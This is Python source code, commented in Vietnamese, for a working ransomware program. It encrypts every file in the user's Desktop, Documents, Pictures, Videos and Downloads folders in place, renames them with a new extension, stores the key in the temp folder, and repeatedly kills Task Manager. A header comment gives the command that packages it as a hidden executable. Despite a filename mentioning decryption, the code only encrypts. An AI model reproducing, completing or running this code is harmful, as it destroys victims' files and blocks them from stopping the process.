# Always encryption %userprofile%/Desktop, %userprofile%/Documents, %userprofile%/Pictures, %userprofile%/Videos, %userprofile%/Downloads
# No console update v1.0.2+
# pyinstaller --onefile --icon=NONE --noconsole abc_ransomware_decrypt_v0_1_2_noconsole_update.py

import time, os, psutil, sys
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    if not os.path.isfile(file_path) or file_path.endswith('.crypt000as21p'):
        return
        
    try:
        with open(file_path, 'rb') as file:
            data = file.read()
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
        
        new_file_path = file_path + '.abcd'
        os.rename(file_path, new_file_path)

    except Exception as e:
        print

def main():
    # 1. Tạo khóa mã hóa
    key = Fernet.generate_key()
    key_string = key.decode()
    
    # 2. Lấy đường dẫn thư mục %temp% và định nghĩa file lưu key
    # os.environ.get('TEMP') sẽ trả về đường dẫn dạng C:\Users\Tên_User\AppData\Local\Temp
    temp_dir = os.environ.get('TEMP')
    key_file_path = os.path.join(temp_dir, "key_abc001.txt")
    
    try:
        # Ghi khóa vào file trong thư mục %temp%
        with open(key_file_path, 'w', encoding='utf-8') as key_file:
            key_file.write(key_string)
    except Exception as e:
        print
    
    # 3. Lấy đường dẫn thư mục user hiện tại (%userprofile%) để mã hóa
    user_profile = os.path.expanduser("~")
    target_paths = [
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Videos"),
        os.path.join(user_profile, "Downloads")
    ]
    
    # Duyệt qua từng thư mục trong danh sách để mã hóa
    for path in target_paths:
        print(f"\nStart scan folders: {path}")
        if os.path.isdir(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    full_path = os.path.join(root, file)
                    encrypt_file(full_path, key)
        else:
            print
            
    while True:
        for process in psutil.process_iter(['name']):
            if process.info['name'] and process.info['name'].lower() in ['taskmgr.exe']:
                print("Process detected: " + process.info['name'])
                process.kill()
        time.sleep(5)
        
    
if __name__ == "__main__":
    main()
